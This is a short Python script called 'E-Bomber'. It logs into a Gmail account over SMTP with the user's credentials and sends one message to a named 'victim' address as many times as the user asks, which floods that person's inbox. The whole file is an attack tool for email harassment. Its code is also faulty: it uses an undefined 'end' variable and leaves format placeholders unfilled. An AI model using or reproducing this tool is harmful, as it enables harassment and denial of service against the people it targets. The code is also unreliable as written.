#imports
import os
import getpass
import smtplib
import sys
if len(sys.argv)<2:
    os.system("cls||clear")
else:
    sys.exit("USAGE: python E-Bomber.py")
    os.system("cls||clear")


#taking input
email = input("Enter your email-id: ")
password = getpass.getpass("Enter your password: ") #USER
vemail = input("Enter victim email-id: ")   #VICTIM
message = input("Enter your message here: ")
count = int(input("Enter how many times you want to spam: "))
print()



try:
    smtp_server='smtp.gmail.com'
    port = int(587)


    #first create a session
    with smtplib.SMTP(smtp_server, port) as server:
        server.ehlo()   #used to identify ourselves to gmail server
        server.starttls()    #for security reasons we put ourselves in TLS(Transport Layer Security) mode
        server.login(email, password)
        print("Sending in Progress.....\n"+end)

        #Now we put a loop for sending emails
        i=0
        while i<count:
            i+=1
            server.sendmail(email, vemail, message)
            if i==1:
                print("%dst EMAIL HAS BEEN SENT SUCCESSFULLY \n"+end)

            elif i==2:
                print("%dnd EMAIL HAS BEEN SENT SUCCESSFULLY \n"+end)

            elif i==3:
                print("%drd EMAIL HAS BEEN SENT SUCCESSFULLY \n"+end)

            else:
                print("%dth EMAIL HAS BEEN SENT SUCCESSFULLY \n"+end)
            sys.stdout.flush()  #Flushing after the process and releasing memory
        #outside the while loop we terminate the session
        server.quit()
    print("ALL DONE..."+end)




except KeyboardInterrupt:
    print()
    print("CANCELLED"+end)
    sys.exit()


except smtplib.SMTPAuthenticationError:
    print()
    print("PROCESS FAILED"+end)
    print("THE EMAIL-ID & PASSWORD IS INCORRECT\n"+end)
    print("CHECK WHETHER THE THE OPTION OF Allow less secure apps is ON"+end)
    sys.exit()
